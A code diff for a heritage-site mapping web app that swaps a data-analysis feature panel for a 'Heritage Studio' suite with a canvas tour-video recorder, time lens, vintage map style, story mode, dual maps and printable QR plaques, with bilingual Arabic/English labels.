@@ -5295,14 +5295,14 @@ console.log('✓ XH advanced suite loaded — '+FEATURES.length+' features');
 })();
 </script>
 <style>
-/* ============ DATA INTELLIGENCE CENTER UI ============ */
+/* ============ HERITAGE STUDIO UI ============ */
 #dcFab{position:fixed;bottom:80px;inset-inline-start:16px;z-index:1150;display:flex;align-items:center;gap:8px;
   padding:11px 18px;border-radius:30px;background:linear-gradient(135deg,var(--plum),#4a1c38);color:#fff;
   font-family:var(--font-body);font-weight:700;font-size:13px;box-shadow:0 8px 26px rgba(110,42,83,.35);
   border:1px solid rgba(255,255,255,.18);transition:transform .2s,box-shadow .2s;cursor:pointer}
 #dcFab:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(110,42,83,.45)}
 body.view-dash #dcFab,body.view-list #dcFab{display:none}
-@media print{#dcFab,#dcOverlay{display:none!important}}
+@media print{#dcFab,#dcOverlay,#stRecBar,#stReplayHud,#stStory,#stDual,#stLensHandle,#stVignette{display:none!important}}
 @media (max-width:640px){#dcFab span{display:none}#dcFab{padding:12px;bottom:80px}}
 
 #dcOverlay{position:fixed;inset:0;background:rgba(10,25,32,.55);backdrop-filter:blur(4px);z-index:1600;
@@ -5319,60 +5319,230 @@ body.view-dash #dcFab,body.view-list #dcFab{display:none}
 #dcClose:hover{background:var(--border)}
 #dcBody{padding:18px 22px 22px;overflow-y:auto;font-size:13.5px;line-height:1.7}
 
-.dc-insights{display:flex;flex-direction:column;gap:10px}
-.dc-insight{display:flex;gap:12px;align-items:flex-start;padding:13px;border-radius:13px;background:var(--panel-2);border:1px solid var(--border)}
-.dc-i-ic{font-size:22px;flex:none;line-height:1.3}
-.dc-insight b{display:block;font-size:13.5px;margin-bottom:3px}
-.dc-insight span{font-size:12px;color:var(--text-soft);line-height:1.6}
-
-.dc-sheet-wrap{max-height:52vh;overflow:auto;border:1px solid var(--border);border-radius:12px}
-.dc-sheet{width:100%;border-collapse:collapse;font-size:12.5px}
-.dc-sheet th{position:sticky;top:0;background:var(--panel-2);padding:9px 10px;text-align:start;font-weight:700;border-bottom:1px solid var(--border);z-index:1}
-.dc-sheet td{padding:6px 10px;border-bottom:1px solid var(--border);white-space:nowrap}
-.dc-sheet-name{max-width:220px;overflow:hidden;text-overflow:ellipsis;cursor:pointer;color:var(--accent)}
-.dc-sheet select,.dc-sheet input{width:100%;min-width:64px;padding:4px 6px;border-radius:6px;border:1px solid var(--border);background:var(--panel);color:var(--text);font-family:inherit;font-size:12px}
-
 .dc-drop{border:2px dashed var(--border);border-radius:14px;padding:32px 20px;text-align:center;cursor:pointer;
   display:flex;flex-direction:column;align-items:center;gap:8px;color:var(--text-soft);transition:all .15s}
 .dc-drop:hover,.dc-drop.over{border-color:var(--accent);background:var(--panel-2);color:var(--text)}
 .dc-drop b{font-size:13.5px;color:var(--text)}
 .dc-drop span{font-size:11.5px;max-width:360px}
 
-.dc-json{width:100%;height:240px;border-radius:12px;border:1px solid var(--border);background:var(--panel-2);
-  color:var(--text);font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;padding:12px;resize:vertical;direction:ltr;text-align:left}
+/* recording bar */
+#stRecBar{position:fixed;top:76px;left:50%;transform:translateX(-50%) translateY(-80px);z-index:1500;
+  display:flex;align-items:center;gap:14px;background:var(--panel);color:var(--text);padding:9px 12px 9px 18px;
+  border-radius:14px;box-shadow:var(--shadow-lg);font-size:13px;font-weight:600;transition:transform .35s;border:1px solid var(--border)}
+#stRecBar.show{transform:translateX(-50%) translateY(0)}
+.stRec-dot{width:11px;height:11px;border-radius:50%;background:#bd343b;animation:stBlink 1s infinite}
+@keyframes stBlink{0%,100%{opacity:1}50%{opacity:.25}}
 
-.dc-exec-kpis{display:flex;gap:14px;flex-wrap:wrap;margin:20px 0}
-.dc-exec-kpi{flex:1;min-width:140px;background:#f4f1ec;border-radius:14px;padding:18px;text-align:center}
-.dc-exec-kpi b{display:block;font-size:34px;font-weight:800;font-family:'Reem Kufi',sans-serif;color:#113241}
-.dc-exec-kpi span{font-size:12px;color:#667}
-.dc-exec-risk{background:#f4f1ec;border-radius:10px;padding:10px 14px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;font-size:13px}
-.dc-exec-risk b{color:#113241}
-.dc-exec-risk span{color:#888;font-size:11.5px}
+/* replay hud */
+#stReplayHud{position:fixed;top:90px;left:50%;transform:translateX(-50%) translateY(-40px);z-index:1490;
+  background:linear-gradient(135deg,rgba(17,50,65,.94),rgba(28,74,92,.94));color:#fff;padding:18px 34px;border-radius:18px;
+  box-shadow:0 18px 50px rgba(0,0,0,.4);text-align:center;opacity:0;pointer-events:none;transition:all .4s}
+#stReplayHud.show{opacity:1;transform:translateX(-50%) translateY(0);pointer-events:auto}
+#stReplayHud .stRp-num{font-family:var(--font-display);font-size:44px;font-weight:800;color:#f0c090;font-variant-numeric:tabular-nums;line-height:1.1}
+#stReplayHud .stRp-lbl{font-size:12px;color:#b8d2d6;margin-bottom:4px}
+#stReplayHud .stRp-reg{font-size:15px;font-weight:700;margin-bottom:10px;min-height:22px}
 
-.dc-qrow{display:flex;gap:8px;margin-bottom:8px;align-items:center}
-.dc-qrow select,.dc-qrow input{padding:8px 10px;border-radius:9px;border:1px solid var(--border);background:var(--panel-2);color:var(--text);font-family:inherit;font-size:12.5px}
-.dc-qrow .dc-qval{flex:1;min-width:0}
-.dc-qdel{width:28px;height:28px;border-radius:8px;background:var(--panel-2);color:var(--text-soft);flex:none;cursor:pointer}
-.dc-qdel:hover{background:#bd343b22;color:#bd343b}
+/* time lens drag handle */
+#stLensHandle{position:absolute;display:none;border-radius:50%;cursor:grab;z-index:700;touch-action:none}
+#stLensHandle:active{cursor:grabbing}
+
+/* vintage mode */
+body.vintage-on #map canvas{filter:sepia(.68) saturate(.75) contrast(.92) brightness(.97)}
+#stVignette{position:absolute;inset:0;display:none;pointer-events:none;z-index:600;
+  background:radial-gradient(ellipse at center,transparent 55%,rgba(80,52,20,.28) 85%,rgba(56,34,12,.5) 100%);
+  box-shadow:inset 0 0 120px rgba(90,60,25,.35)}
+
+/* story mode */
+#stStory{position:fixed;inset:0;display:none;pointer-events:none;z-index:1300}
+#stStory.show{display:block}
+#stStoryCard{position:absolute;top:86px;inset-inline-end:22px;width:min(340px,86vw);pointer-events:auto;
+  background:var(--panel);color:var(--text);border-radius:18px;box-shadow:var(--shadow-lg);border:1px solid var(--border);
+  padding:20px;opacity:0;transform:translateY(14px);transition:all .5s cubic-bezier(.2,.8,.3,1)}
+#stStoryCard.in{opacity:1;transform:none}
+#stStoryCard .stc-k{font-size:11px;font-weight:700;letter-spacing:.5px;color:var(--amber);margin-bottom:6px}
+#stStoryCard h3{font-family:var(--font-display);font-size:18px;margin:0 0 8px;line-height:1.5}
+#stStoryCard p{font-size:12.5px;color:var(--text-soft);margin:4px 0;line-height:1.8}
+#stStoryCard .stc-hint{color:var(--accent);font-weight:600;margin-top:10px}
+#stStoryNav{position:absolute;bottom:24px;left:50%;transform:translateX(-50%);pointer-events:auto;
+  display:flex;align-items:center;gap:12px;background:var(--panel);border-radius:16px;padding:8px 14px;
+  box-shadow:var(--shadow-lg);border:1px solid var(--border);color:var(--text)}
+#stStoryNav button{font-family:inherit;cursor:pointer;color:var(--text)}
+#stStPrev,#stStNext{width:32px;height:32px;border-radius:10px;background:var(--panel-2);font-size:19px;font-weight:700}
+#stStExit{padding:7px 14px;border-radius:10px;background:var(--panel-2);font-size:12px;font-weight:700}
+#stStoryDots{display:flex;gap:6px}
+#stStoryDots span{width:9px;height:9px;border-radius:50%;background:var(--border);cursor:pointer;transition:all .2s}
+#stStoryDots span.on{background:var(--accent);transform:scale(1.25)}
+
+/* dual maps */
+#stDual{position:fixed;inset:0;background:var(--bg);z-index:1550;display:none;flex-direction:column}
+#stDual.show{display:flex}
+#stDualHead{display:flex;justify-content:space-between;align-items:center;padding:12px 18px;
+  background:var(--panel);border-bottom:1px solid var(--border);color:var(--text);font-size:14px}
+#stDualHead button{width:32px;height:32px;border-radius:10px;background:var(--panel-2);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer}
+#stDualBody{flex:1;display:grid;grid-template-columns:1fr 1fr;min-height:0}
+.stDual-side{display:flex;flex-direction:column;min-width:0;border-inline-end:1px solid var(--border)}
+.stDual-side:last-child{border-inline-end:none}
+.stDual-bar{display:flex;align-items:center;gap:10px;padding:8px 12px;background:var(--panel);border-bottom:1px solid var(--border)}
+.stDual-bar select{flex:1;padding:7px 10px;border-radius:9px;border:1px solid var(--border);background:var(--panel-2);color:var(--text);font-family:inherit;font-size:12.5px}
+.stDual-bar span{font-size:11.5px;color:var(--text-soft);white-space:nowrap}
+.stDual-map{flex:1;position:relative;min-height:0}
+@media (max-width:760px){#stDualBody{grid-template-columns:1fr;grid-template-rows:1fr 1fr}}
+
+/* what-if gauges */
+.stWiRow{display:flex;align-items:center;justify-content:center;gap:22px;margin:16px 0;flex-wrap:wrap}
+.stWiGauge{display:flex;flex-direction:column;align-items:center;gap:6px}
+.stWiGauge svg{width:110px;height:110px}
+.stWiGauge span{font-size:12px;color:var(--text-soft);font-weight:600}
+.stWiDelta{text-align:center;font-family:var(--font-display);font-weight:800;font-size:30px;line-height:1}
+.stWiDelta span{display:block;font-size:11px;font-family:var(--font-body);font-weight:600}
+.stWiDelta b{display:block;font-size:18px;opacity:.5}
+
+/* plaques (print) */
+.stPlq{width:100%;max-width:640px;margin:0 auto;text-align:center;padding:34px 30px;box-sizing:border-box;
+  border:2.5px solid #113241;border-radius:4px;position:relative;page-break-after:always;background:#fff;color:#15303a;
+  font-family:'IBM Plex Sans Arabic',sans-serif}
+.stPlq-band{height:9px;background:linear-gradient(90deg,#113241,#2f6f72,#f0c090);border-radius:3px;margin-bottom:22px}
+.stPlq-logo{height:52px;margin-bottom:10px}
+.stPlq-reg{font-size:12px;letter-spacing:1px;color:#6d7e84;margin-bottom:14px}
+.stPlq h2{font-family:'Reem Kufi',sans-serif;font-size:27px;color:#113241;margin:0 0 8px;line-height:1.5}
+.stPlq-loc{font-size:14px;color:#556;margin-bottom:14px}
+.stPlq-cls{display:inline-block;color:#fff;font-weight:700;font-size:13px;padding:6px 18px;border-radius:20px;margin-bottom:20px}
+.stPlq-qr{width:170px;height:170px;display:block;margin:0 auto 10px}
+.stPlq-code{font-size:13px;font-weight:700;color:#113241;margin-bottom:10px}
+.stPlq-foot{font-size:11px;color:#8a99a0;border-top:1px solid #e3ddd2;padding-top:12px}
+.stStkGrid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.stStk{border:1.5px dashed #9bb0b6;border-radius:10px;padding:14px;text-align:center;page-break-inside:avoid;background:#fff;color:#15303a}
+.stStk img{width:110px;height:110px;display:block;margin:0 auto 8px}
+.stStk b{display:block;font-size:12px;margin-bottom:3px;line-height:1.5}
+.stStk span{font-size:10.5px;color:#8a99a0}
 </style>
 <script>
 /* ============================================================
-   DATA INTELLIGENCE CENTER — مركز البيانات المتقدم
-   17 data-management / analysis features, fully isolated from
-   the rest of the app (own FAB + own modal harness), reusing the
-   existing .xh-* CSS classes for visual consistency.
+   HERITAGE STUDIO — استوديو التراث
+   Creative & data suite: tour video recorder, time lens, growth
+   replay, restoration what-if, village stories, vintage map,
+   field plaques, temporal heat, dual synced maps + the kept
+   Smart Importer and Time Machine.
    ============================================================ */
 (function(){
 'use strict';
-try{ if(!DB || !DB.sites || !map){ console.warn('DIC suite: core not ready'); return; } }catch(e){ return; }
+try{ if(!DB || !DB.sites || !map){ console.warn('Studio: core not ready'); return; } }catch(e){ return; }
 
 const L=(ar,en)=>(typeof LANG!=='undefined'&&LANG==='en')?en:ar;
 const el=(tag,cls,html)=>{const e=document.createElement(tag);if(cls)e.className=cls;if(html!=null)e.innerHTML=html;return e;};
 const decayColor=d=>d==null?'#9bb0b6':d<0.2?'#7fb9bb':d<0.35?'#f59e41':d<0.5?'#e95345':'#bd343b';
 const siteName=s=>(typeof nm==='function')?nm(s):s[1];
-const clsLbl=s=>{ const c=DB.classes[s[6]], m=CLASS_META[c]; if(!m) return c; return (typeof LANG!=='undefined'&&LANG==='en')?m.eshort:m.short; };
 
-/* ---------- generic modal (independent from suite1's) ---------- */
+/* ---------- studio-level extra filter hook ---------- */
+let _studioAgeMin=null;
+(function(){
+  const _p=passes;
+  passes=function(s){ if(!_p(s))return false; if(_studioAgeMin!=null && (s[9]==null||s[9]<_studioAgeMin))return false; return true; };
+})();
+
+/* ---------- own village index (suite1's is private) ---------- */
+let _stVillages=null;
+function stVillages(){
+  if(_stVillages)return _stVillages;
+  const g={};
+  for(let i=0;i<DB.sites.length;i++){
+    const s=DB.sites[i];
+    const m=s[1].match(/قرية\s+([^\d]+?)\s+التراثية/);
+    if(!m)continue;
+    const name='قرية '+m[1].trim();
+    let v=g[name];
+    if(!v)v=g[name]={name,idxs:[],lat:0,lng:0,dSum:0,dN:0,reg:s[4],gov:s[5]};
+    v.idxs.push(i); v.lat+=s[2]; v.lng+=s[3];
+    if(s[10]!=null){v.dSum+=s[10];v.dN++;}
+  }
+  _stVillages=Object.values(g).filter(v=>v.idxs.length>=4).map(v=>{
+    v.lat/=v.idxs.length; v.lng/=v.idxs.length;
+    v.avgDecay=v.dN?Math.round(v.dSum/v.dN*100):null;
+    return v;
+  }).sort((a,b)=>b.idxs.length-a.idxs.length);
+  return _stVillages;
+}
+function stVName(v){ return (LANG==='en'&&typeof trDictVal==='function')?trDictVal(v.name):v.name; }
+
+/* ---------- canvas overlay hook (lens + tour caption) ---------- */
+const ST={lens:null, caption:null};
+(function(){
+  const _r=map._render.bind(map);
+  map._render=function(){ _r(); try{ stDraw(); }catch(e){} };
+})();
+function projectedDecay(s,year){
+  const d0=s[10]!=null?s[10]:0.25;
+  const rate=(s[10]!=null&&s[9]>0)?Math.min(0.03,Math.max(0.002,s[10]/s[9])):0.004;
+  return Math.min(1,d0+rate*(year-2026));
+}
+function stDraw(){
+  const ctx=map.ctx;
+  /* --- time lens --- */
+  if(ST.lens){
+    const {x,y,r,year}=ST.lens;
+    ctx.save();
+    ctx.beginPath(); ctx.arc(x,y,r,0,Math.PI*2); ctx.clip();
+    ctx.fillStyle='rgba(13,29,36,.32)'; ctx.fillRect(x-r,y-r,r*2,r*2);
+    // redraw points inside lens with projected colors
+    const pts=map.points, BX=map._baseX, BY=map._baseY;
+    if(pts&&pts.length&&BX){
+      const z=map.z, zi=Math.round(z), scale=Math.pow(2,z-zi), pw=Math.pow(2,zi);
+      const TILE=256, d2r=Math.PI/180;
+      const cx=(map.center[1]+180)/360*TILE*pw;
+      const s0=Math.sin(map.center[0]*d2r), cy=(0.5-Math.log((1+s0)/(1-s0))/(4*Math.PI))*TILE*pw;
+      const ox=cx-map.w/2/scale, oy=cy-map.h/2/scale, hw=map.w/2, hh=map.h/2;
+      let drawn=0;
+      for(let i=0;i<pts.length && drawn<5000;i++){
+        const px=((BX[i]*pw-ox)-hw)*scale+hw; if(px<x-r-8||px>x+r+8)continue;
+        const py=((BY[i]*pw-oy)-hh)*scale+hh; if(py<y-r-8||py>y+r+8)continue;
+        if((px-x)*(px-x)+(py-y)*(py-y)>r*r)continue;
+        const idx=pts[i].data&&pts[i].data.idx;
+        const s=DB.sites[idx]; if(!s)continue;
+        ctx.beginPath(); ctx.arc(px,py,4.5,0,Math.PI*2);
+        ctx.fillStyle=decayColor(projectedDecay(s,year)); ctx.fill();
+        ctx.lineWidth=1.2; ctx.strokeStyle='rgba(255,255,255,.85)'; ctx.stroke();
+        drawn++;
+      }
+    }
+    ctx.restore();
+    // ring + label
+    ctx.save();
+    ctx.beginPath(); ctx.arc(x,y,r,0,Math.PI*2);
+    ctx.lineWidth=3.5; ctx.strokeStyle='#f0c090'; ctx.stroke();
+    ctx.beginPath(); ctx.arc(x,y,r+5,0,Math.PI*2);
+    ctx.lineWidth=1.2; ctx.strokeStyle='rgba(240,192,144,.5)'; ctx.stroke();
+    const lbl=' '+num(year)+' ';
+    ctx.font='700 13px "Reem Kufi","IBM Plex Sans Arabic",sans-serif';
+    const tw=ctx.measureText(lbl).width+18;
+    ctx.fillStyle='#113241'; ctx.beginPath();
+    ctx.roundRect ? ctx.roundRect(x-tw/2,y-r-26,tw,22,11) : ctx.rect(x-tw/2,y-r-26,tw,22); ctx.fill();
+    ctx.fillStyle='#f0c090'; ctx.textAlign='center'; ctx.textBaseline='middle';
+    ctx.fillText(lbl,x,y-r-15);
+    ctx.restore();
+  }
+  /* --- tour caption (baked into recorded video) --- */
+  if(ST.caption){
+    const c=ST.caption;
+    ctx.save();
+    ctx.textAlign='center';
+    const yb=map.h-64;
+    ctx.font='700 20px "Reem Kufi","IBM Plex Sans Arabic",sans-serif';
+    const w=Math.max(ctx.measureText(c.title).width, 200)+56;
+    ctx.fillStyle='rgba(13,29,36,.82)';
+    ctx.beginPath();
+    ctx.roundRect ? ctx.roundRect(map.w/2-w/2,yb-26,w,58,14) : ctx.rect(map.w/2-w/2,yb-26,w,58);
+    ctx.fill();
+    ctx.strokeStyle='rgba(240,192,144,.55)'; ctx.lineWidth=1.4; ctx.stroke();
+    ctx.fillStyle='#fff'; ctx.textBaseline='middle';
+    ctx.fillText(c.title,map.w/2,yb-3);
+    ctx.font='500 12px "IBM Plex Sans Arabic",sans-serif';
+    ctx.fillStyle='#b8d2d6';
+    ctx.fillText(c.sub||'',map.w/2,yb+18);
+    ctx.restore();
+  }
+}
+
+/* ---------- generic modal ---------- */
 let _dcOnClose=null;
 function dcOpen(title,sub){
   $('dcTitle').textContent=title;
@@ -5390,27 +5560,20 @@ function dcClose(){
 
 /* ---------- feature registry ---------- */
 const FEATURES2=[
- {id:'insights', ic:'🔍', ar:'اكتشافات تلقائية',     en:'Auto insights',       dar:'أنماط مستخرجة آلياً من البيانات',           den:'Patterns mined from the data'},
- {id:'integrity',ic:'🩺', ar:'فحص جودة البيانات',     en:'Data integrity scan', dar:'تكرارات وتناقضات وحقول ناقصة',              den:'Duplicates, contradictions, gaps'},
- {id:'cost',     ic:'💰', ar:'تقدير تكلفة الترميم',   en:'Restoration cost est.',dar:'تقدير تقريبي لتكلفة الترميم',              den:'Rough budget estimate'},
- {id:'sheet',    ic:'📊', ar:'وضع الجدول الحي',       en:'Live spreadsheet',    dar:'تعديل مباشر داخل جدول تفاعلي',              den:'Inline-editable data grid'},
- {id:'import',   ic:'📥', ar:'استيراد ذكي',           en:'Smart importer',     dar:'استورد مواقع من CSV بضغطة واحدة',           den:'Import sites from CSV in one click'},
- {id:'timeline2',ic:'🕰️', ar:'آلة الزمن',             en:'Time machine',       dar:'لقطات مؤشرات وتغيّر عبر الزمن',             den:'Stat snapshots over time'},
- {id:'lock',     ic:'🔐', ar:'حماية التعديل',         en:'Edit protection',    dar:'قفل محلي بكلمة مرور',                       den:'Local passphrase lock'},
- {id:'api',      ic:'🔌', ar:'عرض كـ JSON',           en:'View as JSON',       dar:'بيانات جاهزة لأنظمة أخرى',                  den:'Data shaped for other systems'},
- {id:'envrisk',  ic:'⚠️', ar:'المخاطر البيئية',       en:'Environmental risk', dar:'مؤشر تقديري من الارتفاع والموقع',           den:'Estimate from elevation & location'},
- {id:'styles',   ic:'📚', ar:'موسوعة الطرز',          en:'Style encyclopedia', dar:'مرجع الطرز المعمارية في السجل',             den:'Architectural styles reference'},
- {id:'eras',     ic:'🏛️', ar:'العصور التاريخية',      en:'Historical eras',    dar:'تصفح حسب الحقبة التقديرية',                 den:'Browse by approximate era'},
- {id:'exec',     ic:'🎯', ar:'لوحة القيادة التنفيذية', en:'Executive one-pager',dar:'شاشة عرض للمسؤولين',                        den:'Poster screen for leadership'},
- {id:'deck',     ic:'🖼️', ar:'مولّد العرض التقديمي',  en:'Slide-deck generator',dar:'شرائح جاهزة من الفلتر الحالي',              den:'Slides built from current filter'},
- {id:'govatlas', ic:'📖', ar:'أطلس المحافظات',        en:'Governorate atlas',  dar:'تقرير طباعة لكل محافظة',                    den:'Print report per governorate'},
- {id:'neglect',  ic:'🕸️', ar:'المواقع المهملة',       en:'Neglected sites',    dar:'الأقل متابعة أو اكتمال بيانات',             den:'Least-tracked / least-complete'},
- {id:'satellite',ic:'🛰️', ar:'صور تاريخية',           en:'Historical imagery', dar:'افتح الموقع في أرشيف الأقمار الصناعية',     den:'Open the site in satellite history'},
- {id:'sql',      ic:'🧮', ar:'الاستعلام المتقدم',     en:'Advanced query',     dar:'صفّ حسب أكثر من شرط في آن واحد',            den:'Multi-condition filter builder'},
+ {id:'record',  ic:'🎬', ar:'تسجيل الجولة كفيديو',   en:'Record tour as video', dar:'فيديو WebM حقيقي للطيران بين القرى',      den:'A real downloadable flyover video'},
+ {id:'lens',    ic:'🔮', ar:'عدسة الزمن',            en:'Time lens',            dar:'داخل العدسة ٢٠٤٦ وخارجها اليوم',           den:'Inside: 2046 · outside: today'},
+ {id:'replay',  ic:'⏮️', ar:'إعادة تشغيل النمو',     en:'Growth replay',        dar:'شاهد السجل يمتلئ من صفر إلى ٢٠,٨٠٠',       den:'Watch the register fill 0 → 20,800'},
+ {id:'whatif',  ic:'🧪', ar:'محاكي «ماذا لو رمّمنا؟»',en:'Restoration what-if',  dar:'كم يقفز المؤشر الوطني لو رمّمنا؟',         den:'How much does the index jump?'},
+ {id:'story',   ic:'📖', ar:'قصص القرى التفاعلية',   en:'Village stories',      dar:'رحلة سردية فصولها مبانٍ حقيقية',           den:'A scrollytelling journey per village'},
+ {id:'vintage', ic:'🗺️', ar:'الخريطة العتيقة',       en:'Vintage map',          dar:'طراز مخطوطة قديمة بضغطة زر',               den:'Old-manuscript map skin'},
+ {id:'plaques', ic:'🏷️', ar:'اللوحات التعريفية',     en:'Field plaques',        dar:'لوحات وملصقات QR جاهزة للطباعة',           den:'Print-ready QR plaques & labels'},
+ {id:'theat',   ic:'🔥', ar:'الحرارة عبر الزمن',     en:'Temporal heat map',    dar:'كثافة المواقع تتشكل حسب العمر',            den:'Density blooming through the ages'},
+ {id:'dual',    ic:'🆚', ar:'خريطتان متزامنتان',     en:'Dual synced maps',     dar:'قارن منطقتين جنباً إلى جنب',               den:'Compare two regions side-by-side'},
+ {id:'import',  ic:'📥', ar:'الاستيراد الذكي',       en:'Smart importer',       dar:'استورد مواقع من CSV بضغطة واحدة',          den:'Import sites from CSV in one click'},
+ {id:'timemachine',ic:'🕰️', ar:'آلة الزمن',          en:'Time machine',         dar:'لقطات مؤشرات وتغيّر عبر الزمن',            den:'Stat snapshots over time'},
 ];
-
 function openDrawer2(){
-  const b=dcOpen(L('مركز البيانات المتقدم','Data Intelligence Center'),L('أدوات إدارة وتحليل وتوثيق البيانات','Data management, analysis & documentation tools'));
+  const b=dcOpen(L('استوديو التراث','Heritage Studio'),L('أدوات إبداعية وعملية تنقل المنصة لمستوى آخر','Creative & practical tools that take the platform further'));
   const grid=el('div','xh-grid');
   FEATURES2.forEach(f=>{
     const c=el('button','xh-card',`<span class="xh-ic">${f.ic}</span><b>${L(f.ar,f.en)}</b><span class="xh-d">${L(f.dar,f.den)}</span>`);
@@ -5421,209 +5584,477 @@ function openDrawer2(){
 }
 
 /* ============================================================
-   1) AUTO INSIGHTS — pattern miner
+   1) TOUR VIDEO RECORDER
    ============================================================ */
-function openInsights(){
-  const b=dcOpen(L('اكتشافات تلقائية','Auto insights'),L('أنماط إحصائية مستخرجة آلياً من السجل الحالي (يتبع الفلاتر)','Statistical patterns mined from the currently filtered register'));
-  const vis=DB.sites.filter(passes);
-  const insights=[];
-  // material vs decay
-  const matDecay={};
-  for(const s of vis){ if(!s[16]||!s[16].length||s[10]==null) continue;
-    for(const mi of s[16]){ const key=DB.dict[mi]; if(!key) continue;
-      (matDecay[key]=matDecay[key]||{sum:0,n:0}).sum+=s[10]; matDecay[key].n++; } }
-  const matRanked=Object.entries(matDecay).filter(([,v])=>v.n>=15).map(([k,v])=>[k,v.sum/v.n,v.n]).sort((a,b)=>b[1]-a[1]);
-  if(matRanked.length>=2){
-    const worst=matRanked[0], best=matRanked[matRanked.length-1];
-    if(worst[1]>best[1]*1.15){
-      insights.push({ic:'🧱',t:L(`مواد "${dvSafe(worst[0])}" تتهدّم أسرع`,`"${dvSafe(worst[0])}" material decays faster`),
-        d:L(`بمتوسط ${Math.round(worst[1]*100)}٪ مقابل ${Math.round(best[1]*100)}٪ لمواد "${dvSafe(best[0])}" (${num(worst[2])} موقع)`,
-            `avg ${Math.round(worst[1]*100)}% vs ${Math.round(best[1]*100)}% for "${dvSafe(best[0])}" (${num(worst[2])} sites)`)});
-    }
+let _recState=null;
+function startRecording(){
+  if(_recState){ stopRecording(); return; }
+  if(!map.canvas.captureStream || typeof MediaRecorder==='undefined'){
+    toast(L('المتصفح لا يدعم تسجيل الفيديو','This browser does not support video recording')); return;
   }
-  // age vs decay correlation bucket
-  const buckets={};
-  for(const s of vis){ if(s[9]==null||s[10]==null) continue;
-    const b2=s[9]<50?'<50':s[9]<100?'50-99':s[9]<200?'100-199':'200+';
-    (buckets[b2]=buckets[b2]||{sum:0,n:0}).sum+=s[10]; buckets[b2].n++; }
-  const bKeys=['<50','50-99','100-199','200+'].filter(k=>buckets[k]&&buckets[k].n>=10);
-  if(bKeys.length>=2){
-    const oldest=bKeys[bKeys.length-1], youngest=bKeys[0];
-    const oAvg=buckets[oldest].sum/buckets[oldest].n, yAvg=buckets[youngest].sum/buckets[youngest].n;
-    insights.push({ic:'📈',t:L('العمر يرتبط بارتفاع نسبة التهدّم',oAvg>yAvg?'Age correlates with higher decay':'Older sites are not necessarily more decayed'),
-      d:L(`مواقع بعمر ${oldest} سنة: متوسط تهدّم ${Math.round(oAvg*100)}٪، مقابل ${Math.round(yAvg*100)}٪ لمواقع ${youngest} سنة`,
-          `Sites aged ${oldest} yrs: avg decay ${Math.round(oAvg*100)}%, vs ${Math.round(yAvg*100)}% for ${youngest} yrs`)});
-  }
-  // region with worst avg decay (min 30 sites)
-  const byReg={};
-  for(const s of vis){ if(s[10]==null) continue; (byReg[s[4]]=byReg[s[4]]||{sum:0,n:0}).sum+=s[10]; byReg[s[4]].n++; }
-  const regRanked=Object.entries(byReg).filter(([,v])=>v.n>=30).map(([ri,v])=>[+ri,v.sum/v.n,v.n]).sort((a,b)=>b[1]-a[1]);
-  if(regRanked.length){
-    const [ri,avg,n]=regRanked[0];
-    insights.push({ic:'📍',t:L(`${DB.regions[ri]} الأعلى تهدّماً`,`${DB.regions[ri]} has the highest decay`),
-      d:L(`متوسط ${Math.round(avg*100)}٪ عبر ${num(n)} موقع موثّق`,`avg ${Math.round(avg*100)}% across ${num(n)} documented sites`)});
-  }
-  // class-A protection gap: % of class A with no ongoing works
-  let aTotal=0,aNoWorks=0;
-  const ai=DB.classes.indexOf('أ');
-  for(const s of vis){ if(s[6]!==ai) continue; aTotal++;
-    const wv=s[18]; const hasWorks=wv>=0&&DB.dict[wv]&&/جار|قائم|نعم|ترميم/.test(DB.dict[wv]||''); if(!hasWorks)aNoWorks++; }
-  if(aTotal>=5){
-    const pct=Math.round(aNoWorks/aTotal*100);
-    insights.push({ic:'🛡️',t:L('فجوة حماية في الفئة (أ)',"Protection gap in Class A"),
-      d:L(`${pct}٪ من مواقع الفئة (أ) (${num(aTotal)} موقع) بلا أعمال ترميم جارية مسجّلة`,`${pct}% of Class A sites (${num(aTotal)} total) have no recorded ongoing works`)});
-  }
-  // building vs zone split shift
-  const bldgN=vis.filter(s=>DB.types[s[7]]!=='منطقة').length, zoneN=vis.length-bldgN;
-  insights.push({ic:'🏗️',t:L('توزيع النوع',"Type distribution"),
-    d:L(`${num(bldgN)} مبنى مقابل ${num(zoneN)} منطقة — نسبة المباني ${Math.round(bldgN/(vis.length||1)*100)}٪`,
-        `${num(bldgN)} buildings vs ${num(zoneN)} zones — buildings make up ${Math.round(bldgN/(vis.length||1)*100)}%`)});
-
-  const cards=insights.map(ins=>`<div class="dc-insight"><span class="dc-i-ic">${ins.ic}</span><div><b>${ins.t}</b><span>${ins.d}</span></div></div>`).join('');
-  b.innerHTML=`<div class="dc-insights">${cards||`<div class="xh-note">${L('لا توجد أنماط كافية ضمن الفلتر الحالي','Not enough data in the current filter')}</div>`}</div>
-    <div class="xh-note">${L('هذه ملاحظات إحصائية آلية وليست استنتاجات نهائية — استخدمها كنقطة انطلاق للتحقق الميداني.','Automated statistical observations, not final conclusions — use as a starting point for field verification.')}</div>`;
+  const vs=stVillages().slice(0,10);
+  if(!vs.length){ toast(L('لا توجد قرى كافية','Not enough villages')); return; }
+  dcClose(); setView('map');
+  let rec, chunks=[];
+  try{
+    const stream=map.canvas.captureStream(30);
+    let mime='video/webm;codecs=vp9';
+    if(!MediaRecorder.isTypeSupported(mime)) mime='video/webm';
+    rec=new MediaRecorder(stream,{mimeType:mime,videoBitsPerSecond:5_000_000});
+  }catch(err){ toast(L('تعذّر بدء التسجيل','Could not start recording')); return; }
+  rec.ondataavailable=e=>{ if(e.data&&e.data.size)chunks.push(e.data); };
+  rec.onstop=()=>{
+    const blob=new Blob(chunks,{type:'video/webm'});
+    if(blob.size>1000){
+      const a=document.createElement('a');
+      a.href=URL.createObjectURL(blob); a.download='heritage_tour.webm'; a.click();
+      toast(L('✓ تم حفظ الفيديو — شاهده أو شاركه مباشرة','✓ Video saved — watch or share it'));
+    } else toast(L('التسجيل كان قصيراً جداً','Recording too short'));
+  };
+  _recState={rec,step:0,timer:null,vs};
+  rec.start(1000);
+  $('stRecBar').classList.add('show');
+  const tick=()=>{
+    if(!_recState)return;
+    const secs=Math.round((Date.now()-_recState.t0)/1000);
+    $('stRecTime').textContent=num(Math.floor(secs/60))+':'+String(secs%60).padStart(2,'0');
+  };
+  _recState.t0=Date.now();
+  _recState.clock=setInterval(tick,500);
+  recStep();
 }
